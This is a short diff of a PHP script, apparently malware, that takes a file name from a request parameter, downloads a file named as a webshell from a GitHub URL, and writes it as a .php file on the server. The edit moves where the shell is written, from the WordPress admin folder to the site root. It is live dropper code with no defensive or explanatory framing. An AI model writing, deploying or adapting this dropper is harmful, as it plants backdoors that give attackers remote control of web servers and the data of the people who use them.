@@ -165,7 +165,7 @@ $ra44 = $_REQUEST['d'];
 $ra44x = $_REQUEST['d'];
 
 
-$chec4k = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/".$ra44.".php" ;
+$chec4k = $_SERVER['DOCUMENT_ROOT'] . "/".$ra44.".php" ;
 $text = http_get('https://raw.githubusercontent.com/boters/WEBSHELL/master/gblk.txt');
 $open = fopen($chec4k, 'w');
 fwrite($open, $text);
